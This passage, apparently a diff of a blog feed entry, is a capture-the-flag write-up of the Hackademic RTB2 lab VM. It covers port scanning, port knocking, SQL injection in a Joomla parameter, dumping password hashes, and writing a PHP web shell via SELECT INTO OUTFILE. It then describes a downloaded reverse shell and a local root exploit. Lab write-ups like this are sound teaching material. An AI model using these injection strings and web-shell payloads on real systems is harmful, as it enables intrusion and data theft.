-    <id>http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2</id>
-    <content type="html"><![CDATA[<p>The objective is the same as the previous one, get root and read key.txt</p>
-
-<!-- more -->
-
-
-<h1>Recon</h1>
-
-<p>Again, this will be a web hacking mission, only web server is available.</p>
-
-<p><img class="center" src="/images/pentest/hackademic/rtb2-web.png" title="&lsquo;hackademic&rsquo; &lsquo;hackademic website&rsquo;" ></p>
-
-<p>There was nothing in the source code, no suspicious headers, no sql injection in the login. I ran OpenVAS, Dirbuster and Nikto on the target, but nothing more was uncovered other than a Phpmyadmin interface, which kept giving me &ldquo;unable to connect to MySQL server&rdquo; errors no matter what I did. I assumed that maybe the web server is a false front and that might be something else hidden on the machine, so I ran a UDP scan next, which revealed an additional port:</p>
-
-<p><code>plain
-nmap -sU -F -n -T4 192.168.80.166
-PORT     STATE SERVICE  REASON
-5353/udp open  zeroconf udp-response ttl 255
-</code></p>
-
-<p>Further internet research and a version scan implied that this was the <a href="https://en.wikipedia.org/wiki/Multicast_DNS">Multicast DNS</a> protocol. I couldn&rsquo;t find anything to exploit it, though. But it made me want to take a closer look at Nmap&rsquo;s results again, so I ran another scan:</p>
-
-<p>``` plain
-nmap  -p- 192.168.80.166</p>
-
-<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-07-21 08:14 EDT
-Nmap scan report for 192.168.80.166
-Host is up, received arp-response (0.00024s latency).
-Not shown: 65533 closed ports, 1 filtered port
-Reason: 65533 resets and 1 port-unreach
-PORT   STATE SERVICE REASON
-80/tcp open  http    syn-ack ttl 64
-```</p>
-
-<p>This time I read it more carefully and I noticed it reported a filtered port. I ran Nmap again with the verbose flags and <code>&mdash;packet-trace</code> option and this time it returned a new port:</p>
-
-<p><code>plain
-PORT    STATE SERVICE REASON
-80/tcp  open  http    syn-ack ttl 64
-666/tcp open  doom    syn-ack ttl 64
-</code></p>
-
-<p>This must have been the previously reported as filtered port. Version scanning revealed that this was actually another web server!</p>
-
-<p><code>plain
-666/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.14 ((Ubuntu))
-</code></p>
-
-<p>Before continuing, I am taking a detour here because it seems I had bypassed a secion of the challenge. When I came back to resume working on this VM, I couldn&rsquo;t get the 666 port to open, and I had no idea what triggered it. I looked at g0tmi1lk&rsquo;s video and it turns out there is a SQLi string that you can insert into the password field of the first web server that gives you a different response. The string is <code>&lsquo; or 1=1&mdash;&rsquo;</code>. I previously tested this parameter with sqlmap and also inserting another variation of this string, with no satisfactory answer. I assumed maybe it&rsquo;s hardcoded, because the slightest change, as in putting a space after the comment character invalidates it. Anyway, with this injection attempt you are taken to a page that says &ldquo;Ok, nice shot&hellip;&hellip;but, you are looking in a wrong place bro! ;&ndash;)&rdquo;. In the source, there was a URL encoded string:</p>
-
-<p><code>plain
-%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A
-</code></p>
-
-<p>Decoding it yielded a hex string this time:</p>
-
-<p><code>plain
-3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0a 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 0d 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e
-</code></p>
-
-<p>After decoding the hex string, I got this message:</p>
-
-<p><code>plain
-&lt;---------&gt;
-Knock Knock Knockin' on heaven's door .. :)
-00110001 00110000 00110000 00110001 00111010 00110001 00110001 00110000 00110001 00111010 00110001 00110000 00110001 00110001 00111010 00110001 00110000 00110000 00110001
-&lt;---------&gt;
-</code></p>
-
-<p>Alright, this is a reference to <a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a>. I further decoded the binary data to ascii by using <a href="http://www.snarkles.net/scripts/sneak/sneak.php">this site</a> and got the string <em>1001:1101:1011:1001</em>. So I assumed this string will need to be given to the host in order to open up the port.</p>
-
-<p>``` plain</p>
-
-<h1>!/bin/bash</h1>
-
-<p>for i in 1001 1101 1011 1001
-do
-nc 192.168.80.167 80 $i
-done
-```</p>
-
-<p>Indeed, now the 666 port was opened. Not sure how I previously got to it without going through the sequence</p>
-
-<p><img class="center" src="/images/pentest/hackademic/rtb2-hidden.png" title="&lsquo;hidden web server&rsquo; &lsquo;hidden web server&rsquo;" ></p>
-
-<p>Ok, back to hacking! First thing I noticed was a really old Joomla version, so I fired up <code>joomscan</code> and among the 4 vulnerabilities found, I show here one that seemed more interesting:</p>
-
-<p><code>plain
-Info -&gt; CorePlugin: TinyMCE TinyBrowser addon multiple vulnerabilities
-Versions effected: Joomla! 1.5.12
-Check: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/
-Exploit: While Joomla! team announced only File Upload vulnerability, in fact there are many. See: http://www.milw0rm.com/exploits/9296
-Vulnerable? Yes
-</code></p>
-
-<p>Ok, let&rsquo;s keep this in mind and continue looking. I ran Nikto against this new web server and it reported entries in robots.txt!</p>
-
-<p><code>plain
-User-agent: *
-Disallow: /administrator/
-Disallow: /cache/
-Disallow: /components/
-Disallow: /images/
-Disallow: /includes/
-Disallow: /installation/
-Disallow: /language/
-Disallow: /libraries/
-Disallow: /media/
-Disallow: /modules/
-Disallow: /plugins/
-Disallow: /templates/
-Disallow: /tmp/
-Disallow: /xmlrpc/
-</code></p>
-
-<h1>Exploit</h1>
-
-<p>I visited those directories but there was nothing interesting. The administrator one contained a message stating that I am not the real administrator. So I went back to testing for SQLi in the login page and in the URL parameters. In particular, I was interested by the <em>Itemid</em> parameter. When I tampered with it, I got messages that I need to login to view that area of the site. I used sqlmap but no vulnerability found. Seeing so many parameters in the URL, I decided to test each one of them by visiting every page and trying a single quote in every parameter. And the jackpot was found at the <code>letter</code> parameter in the List contents page:</p>
-
-<p>``` plain
-<a href="http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3">http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3</a></p>
-
-<p>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;%&rsquo; GROUP BY title ORDER BY title' at line 1 SQL=SELECT id, title FROM jos_content WHERE state = 1 AND UPPER(title) LIKE &lsquo;&rsquo;%&lsquo; GROUP BY title ORDER BY title
-&rsquo;
-```</p>
-
-<p>With this information, I pointed sqlmap to the vulnerable parameter and retrieved the jos_users table of the joomla database, where among others, there were usernames and password hashes</p>
-
-<p><code>plain
-username    usertype    password
-Administrator   Super Administrator 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
-JSmith  Registered  992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF
-BTallor Registered  abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy
-hacky   Registered  19630caea014ce1746ec41b074973c04:LSGCiJLhUyxZRLOMAcy96PTmbN8nnxIL
-</code></p>
-
-<p>Well, these hashes won&rsquo;t help much, as a quick search didn&rsquo;t give me any way to crack them fast and easy. I did research a bit on the internet and found out that these are salted hashes, stored in the format <code>md5 hash:salt</code>. I also found there is a Perl script that can help with cracking such hashes, called <a href="http://morxploit.com/joomlacrack.txt">joomlacrack.pl</a>. But I thought I might not need to crack them if I could use sqlmap to execute commands on the server and write a PHP backdoor there. So that&rsquo;s what I tried next. Passing <em>pwd</em> to <em>&mdash;os-cmd</em> gave me the location of the current directory, which is /var/www. I tried writing a shell directly in this location but I failed. So next I listed the contents of the present directory and noticed a <em>configuration.php</em> file that I read, and inside there were credentials for the database:</p>
-
-<p><code>plain
-/* Database Settings */
-var $dbtype = 'mysql';
-var $host = 'localhost';
-var $user = 'root';
-var $password = 'yUtJklM97W';
-var $db = 'joomla';
-var $dbprefix = 'jos_';
-</code></p>
-
-<p>I went to the phpmyadmin interface and logged in as root. Then I was able to use SQL to create a rudimentary shell:</p>
-
-<p><code>sql
-SELECT
-"&lt;? system($_REQUEST['cmd']); ?&gt;"
-INTO OUTFILE "/var/www/cmd.php";
-</code></p>
-
-<p>After uploading this shell, I used to download the reverse PHP shell that I hosted with Python&rsquo;s SimpleHTTPServer. And then I navigated to it and received the connection on my Netcat listener:</p>
-
-<p><code>plain
-Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
- 15:14:37 up  4:02,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: can't access tty; job control turned off
-</code></p>
-
-<p>The local exploit that worked was the same one I used in the previous Hackademic challenge, the <a href="https://www.exploit-db.com/exploits/15285/">RDS Protocol Local Privilege Escalation exploit</a>. Again, I used wget to download it from my machine and ran it:</p>
-
-<p><code>plain
-[snipped]
-[*] Restoring function pointer...
-id
-uid=0(root) gid=0(root)
-ls /root/
-Desktop
-Key.txt
-</code></p>
-
-<p>Trying to read the key gave a huge base64 encoded string, so I copied it to the web server directory, gave it permissions for everyone, and then I downloaded it on my machine, where I could decode it:</p>
-
-<p><code>plain
-root@pwnbox:~/Downloads#base64 -d key.txt &gt; decoded
-root@pwnbox:~/Downloads#file decoded
-decoded: PNG image data, 756 x 344, 8-bit/color RGB, non-interlaced
-</code></p>
-
-<p>So it&rsquo;s an image! (when I tried reading it there was binary garbage, so I assumed it must be another type of file than a text one). I used this <a href="http://codebeautify.org/base64-to-image-converter">base64 to image converter</a> to see the image:</p>
-
-<p><img class="center" src="/images/pentest/hackademic/rtb2-win.png" title="&lsquo;hackademic rtb2&rsquo; &lsquo;hackademic rtb 2 finished&rsquo;" ></p>
-
-<h1>Debriefing</h1>
-
-<p>This host implemented a sneaky defense of port knocking in order to serve the second web server. It was a bit unrealistic to require a hardcoded value for the password parameter on the first web server in my opinion. The second server was vulnerable to real SQL injection that could read files on the system and execute commands. Having the database root credentials readily available allowed me to gain a foothold on the machine, from which the only step left was finding an exploit that would give me root.</p>
-
-<p>``` plain
-/ You are only young once, but you can \
-\ stay immature indefinitely.          /</p>
 
 <hr />
 
